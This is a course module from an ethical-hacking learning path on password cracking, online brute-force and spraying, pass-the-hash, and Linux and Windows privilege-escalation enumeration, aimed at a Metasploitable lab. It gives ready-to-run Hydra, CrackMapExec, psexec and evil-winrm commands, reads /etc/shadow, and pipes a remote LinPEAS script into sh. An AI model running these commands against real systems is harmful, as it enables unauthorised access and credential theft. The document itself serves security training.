# Stage 06 — System Hacking Fundamentals
## Password Attacks and Privilege Escalation Concepts

**Certified Ethical Hacking I Learning Path**  
**Audience:** Learners who have completed Stages 00-05

Welcome to Stage 06. You've identified vulnerabilities—now it's time to understand how attackers gain and expand access to systems. This stage covers password attacks, authentication mechanisms, and privilege escalation concepts.

---

## Prerequisites

- [ ] Completed Stages 00-05
- [ ] Understand vulnerability analysis
- [ ] Lab environment functional
- [ ] Basic Linux/Windows knowledge

---

## Why This Stage Matters

Password attacks and privilege escalation are core penetration testing skills. Weak credentials are one of the most common vulnerabilities, and escalating from low-privilege to high-privilege access is often necessary to demonstrate full impact.

---

## What You Will Learn

- Understand password attack methodologies
- Identify and crack password hashes
- Perform online password attacks
- Understand Windows and Linux authentication
- Learn privilege escalation concepts
- Use common privilege escalation techniques

---

## Time Estimate: 35-40 hours

---

## Part 1 — Password Attack Concepts (Milestone 1)

### Attack Types

```
┌─────────────────────────────────────────────────────────────────┐
│                 Password Attack Types                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ONLINE ATTACKS (Against live service)                          │
│  ├── Brute Force - Try all combinations                        │
│  ├── Dictionary - Try word list                                 │
│  ├── Credential Stuffing - Leaked credentials                  │
│  └── Password Spraying - Few passwords, many users             │
│                                                                  │
│  OFFLINE ATTACKS (Against captured hashes)                      │
│  ├── Dictionary Attack - Word list against hash                │
│  ├── Brute Force - All combinations                            │
│  ├── Rainbow Tables - Pre-computed hashes                      │
│  └── Rule-Based - Dictionary with modifications                │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Hash Types

| Hash | Length | Example |
|------|--------|---------|
| MD5 | 32 hex | 5d41402abc4b2a76b9719d911017c592 |
| SHA1 | 40 hex | aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d |
| SHA256 | 64 hex | 2cf24dba5fb0a30e26e83b2ac5b9e29e... |
| NTLM | 32 hex | 32ed87bdb5fdc5e9cba88547376818d4 |
| bcrypt | 60 char | $2b$12$... |

### Hash Identification

```bash
# Using hash-identifier
hash-identifier

# Using hashid
hashid '5d41402abc4b2a76b9719d911017c592'
hashid -m '5d41402abc4b2a76b9719d911017c592'  # Show hashcat mode
```

---

## Part 2 — Password Cracking (Milestone 2)

### John the Ripper

```bash
# Basic usage
john hashes.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Specify format
john --format=raw-md5 hashes.txt
john --format=nt hashes.txt

# Rules (modify wordlist)
john --wordlist=wordlist.txt --rules hashes.txt

# List formats
john --list=formats
```

### Hashcat (GPU-accelerated)

```bash
# Basic usage
hashcat -m [hash_type] -a [attack_mode] hash.txt wordlist.txt

# Hash types (-m)
# 0 = MD5
# 100 = SHA1
# 1000 = NTLM
# 1800 = sha512crypt (Linux)
# 3200 = bcrypt

# Attack modes (-a)
# 0 = Dictionary
# 1 = Combination
# 3 = Brute force
# 6 = Dictionary + Mask

# Examples
hashcat -m 0 -a 0 md5_hash.txt rockyou.txt          # MD5 dictionary
hashcat -m 1000 -a 0 ntlm_hash.txt rockyou.txt      # NTLM dictionary
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a             # MD5 brute force

# Show results
hashcat -m 0 hash.txt --show

# Masks
# ?l = lowercase
# ?u = uppercase
# ?d = digit
# ?s = special
# ?a = all
```

### Wordlists

```bash
# Common locations in Kali
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/
/usr/share/seclists/Passwords/

# Extract rockyou if needed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Custom wordlist generation
cewl http://target.com -w custom_wordlist.txt

# Crunch (generate wordlists)
crunch 8 8 -t ,@@@@@@@ -o wordlist.txt  # 8 char, start with number
```

### Hands-On Exercise: Password Cracking

```bash
mkdir -p ~/security-lab/notes/stage06

# Create test hashes
echo -n "password" | md5sum | cut -d' ' -f1 > ~/security-lab/notes/stage06/test_md5.txt
echo -n "admin123" | md5sum | cut -d' ' -f1 >> ~/security-lab/notes/stage06/test_md5.txt

# Crack with John
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt ~/security-lab/notes/stage06/test_md5.txt

# Show results
john --show --format=raw-md5 ~/security-lab/notes/stage06/test_md5.txt
```

---

## Part 3 — Online Password Attacks (Milestone 3)

### Hydra

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$TARGET

# With username list
hydra -L users.txt -P passwords.txt ssh://$TARGET

# FTP
hydra -l admin -P wordlist.txt ftp://$TARGET

# HTTP POST form
hydra -l admin -P wordlist.txt $TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# HTTP Basic Auth
hydra -l admin -P wordlist.txt $TARGET http-get /admin

# Limit threads and wait
hydra -l admin -P wordlist.txt -t 4 -W 30 ssh://$TARGET

# Common options
# -l username / -L user_list
# -p password / -P password_list
# -t threads
# -V verbose
# -f exit on first success
```

### Medusa

```bash
# SSH
medusa -h $TARGET -u admin -P wordlist.txt -M ssh

# FTP
medusa -h $TARGET -u admin -P wordlist.txt -M ftp

# Multiple hosts
medusa -H hosts.txt -u admin -P wordlist.txt -M ssh
```

### Ncrack

```bash
# SSH
ncrack -v --user admin -P wordlist.txt ssh://$TARGET

# Multiple services
ncrack -v --user admin -P wordlist.txt ssh://$TARGET ftp://$TARGET
```

### CrackMapExec (SMB/WinRM)

```bash
# SMB password spray
crackmapexec smb $TARGET -u users.txt -p 'Password123'

# SMB with hash
crackmapexec smb $TARGET -u admin -H 'NTLM_HASH'

# Multiple targets
crackmapexec smb 192.168.1.0/24 -u admin -p password
```

### Hands-On Exercise: Online Attacks

```bash
TARGET="192.168.56.101"

# Create small wordlist for testing
echo -e "admin\nroot\nuser\nmsfadmin" > ~/security-lab/notes/stage06/users.txt
echo -e "password\nadmin\n123456\nmsfadmin" > ~/security-lab/notes/stage06/passwords.txt

# Test SSH (Metasploitable credentials: msfadmin:msfadmin)
hydra -L ~/security-lab/notes/stage06/users.txt \
      -P ~/security-lab/notes/stage06/passwords.txt \
      ssh://$TARGET -t 4 -V

# Test FTP
hydra -L ~/security-lab/notes/stage06/users.txt \
      -P ~/security-lab/notes/stage06/passwords.txt \
      ftp://$TARGET -t 4 -V
```

---

## Part 4 — Windows Authentication (Milestone 4)

### Windows Password Storage

```
┌─────────────────────────────────────────────────────────────────┐
│              Windows Password Storage                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  SAM DATABASE (Local accounts)                                  │
│  ├── Location: C:\Windows\System32\config\SAM                  │
│  ├── Locked while Windows running                               │
│  ├── Contains NTLM hashes                                       │
│  └── Need SYSTEM access to extract                              │
│                                                                  │
│  NTDS.DIT (Domain accounts)                                     │
│  ├── Location: C:\Windows\NTDS\NTDS.dit                        │
│  ├── Active Directory database                                  │
│  ├── Contains all domain credentials                            │
│  └── Requires domain admin access                               │
│                                                                  │
│  HASH TYPES                                                     │
│  ├── LM Hash - Legacy, weak (disabled by default)              │
│  └── NTLM Hash - Current standard                               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Pass-the-Hash

Instead of cracking hashes, use them directly:

```bash
# With CrackMapExec
crackmapexec smb $TARGET -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# With psexec (Impacket)
psexec.py administrator@$TARGET -hashes 'LM:NTLM'

# With evil-winrm
evil-winrm -i $TARGET -u administrator -H 'NTLM_HASH'
```

---

## Part 5 — Linux Authentication (Milestone 5)

### Linux Password Files

```
┌─────────────────────────────────────────────────────────────────┐
│              Linux Password Storage                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  /etc/passwd (Readable by all)                                  │
│  ├── User information                                           │
│  ├── Format: user:x:uid:gid:info:home:shell                    │
│  └── 'x' means password in shadow file                         │
│                                                                  │
│  /etc/shadow (Root only)                                        │
│  ├── Actual password hashes                                     │
│  ├── Format: user:hash:lastchange:min:max:warn:inactive:expire │
│  └── Hash format: $id$salt$hash                                │
│                                                                  │
│  HASH IDENTIFIERS                                               │
│  ├── $1$  = MD5                                                │
│  ├── $5$  = SHA-256                                            │
│  ├── $6$  = SHA-512 (most common now)                          │
│  └── $2a$ = bcrypt                                             │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Unshadow and Crack

```bash
# Combine passwd and shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# View results
john --show unshadowed.txt
```

---

## Part 6 — Privilege Escalation Concepts (Milestone 6)

### What is Privilege Escalation?

Gaining higher access than originally obtained:
- User → Administrator/Root
- Low-privilege user → Higher-privilege user

### Linux Privilege Escalation Vectors

```
┌─────────────────────────────────────────────────────────────────┐
│           Linux Privilege Escalation Vectors                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  SUDO MISCONFIGURATIONS                                         │
│  ├── Check: sudo -l                                            │
│  ├── GTFOBins for allowed commands                             │
│  └── NOPASSWD entries                                          │
│                                                                  │
│  SUID BINARIES                                                  │
│  ├── Check: find / -perm -4000 2>/dev/null                     │
│  ├── Custom SUID files                                         │
│  └── GTFOBins for SUID exploits                                │
│                                                                  │
│  KERNEL EXPLOITS                                                │
│  ├── Check: uname -a                                           │
│  ├── Research kernel version CVEs                              │
│  └── DirtyCow, etc.                                            │
│                                                                  │
│  CRON JOBS                                                      │
│  ├── Check: cat /etc/crontab                                   │
│  ├── Writable scripts in cron                                  │
│  └── PATH manipulation                                         │
│                                                                  │
│  WRITABLE FILES                                                 │
│  ├── /etc/passwd writable                                      │
│  ├── Writable service configs                                  │
│  └── Writable scripts run as root                              │
│                                                                  │
│  CAPABILITIES                                                   │
│  ├── Check: getcap -r / 2>/dev/null                           │
│  └── Dangerous capabilities (cap_setuid, etc.)                 │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Linux Enumeration Commands

```bash
# System info
uname -a
cat /etc/os-release

# User info
whoami
id
sudo -l

# SUID files
find / -perm -4000 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/

# Network
netstat -tulpn
ss -tulpn

# Running processes
ps aux

# Capabilities
getcap -r / 2>/dev/null
```

### Automated Enumeration Tools

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

### Windows Privilege Escalation Vectors

```
┌─────────────────────────────────────────────────────────────────┐
│         Windows Privilege Escalation Vectors                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  SERVICE MISCONFIGURATIONS                                      │
│  ├── Unquoted service paths                                    │
│  ├── Weak service permissions                                   │
│  └── Modifiable service binaries                               │
│                                                                  │
│  REGISTRY                                                       │
│  ├── AlwaysInstallElevated                                     │
│  ├── Autorun entries                                           │
│  └── Stored credentials                                        │
│                                                                  │
│  SCHEDULED TASKS                                                │
│  ├── Writable task binaries                                    │
│  └── Modifiable task settings                                  │
│                                                                  │
│  TOKEN MANIPULATION                                             │
│  ├── SeImpersonatePrivilege                                    │
│  ├── SeAssignPrimaryTokenPrivilege                             │
│  └── Potato attacks                                            │
│                                                                  │
│  CREDENTIALS                                                    │
│  ├── Stored credentials                                        │
│  ├── Cached credentials                                        │
│  └── Configuration files                                       │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Windows Enumeration Commands

```cmd
# System info
systeminfo
hostname

# User info
whoami
whoami /priv
whoami /groups
net user

# Network
ipconfig /all
netstat -ano

# Services
sc query
wmic service list brief

# Scheduled tasks
schtasks /query /fo LIST /v

# Search for passwords
findstr /si password *.txt *.xml *.config
```

### Automated Windows Enumeration

```powershell
# WinPEAS
.\winPEASany.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
```

---

## Stage 06 Assessment

### Written Assessment

1. What is the difference between online and offline password attacks?
2. How do you identify a hash type?
3. What is the difference between John and Hashcat?
4. Explain pass-the-hash attacks.
5. Where are Linux password hashes stored?
6. What are SUID binaries and why are they a privesc vector?
7. Name five Linux privilege escalation techniques.
8. What is sudo -l used for?
9. What tools can automate privilege escalation enumeration?
10. Why is password spraying different from brute forcing?

### Practical Assessment

1. Create and crack sample hashes with John and Hashcat
2. Perform online attack against Metasploitable SSH/FTP
3. Enumerate Linux privilege escalation vectors on Metasploitable
4. Document privilege escalation findings

---

## Stage 06 Completion Checklist

- [ ] Understand password attack types
- [ ] Can identify hash types
- [ ] Can use John the Ripper
- [ ] Can use Hashcat
- [ ] Can use Hydra for online attacks
- [ ] Understand Windows/Linux authentication
- [ ] Know privilege escalation vectors
- [ ] Can enumerate privesc opportunities

---

## What's Next: Stage 07 Preview

In Stage 07 — Web Application Security, you will:
- Deep dive into OWASP Top 10
- Use Burp Suite for web testing
- Test for SQL injection
- Test for Cross-Site Scripting
- Understand web authentication vulnerabilities

---

**Commit and proceed when ready:**

```bash
cd ~/security-lab
git add .
git commit -m "Complete Stage 06 - System Hacking Fundamentals"
```
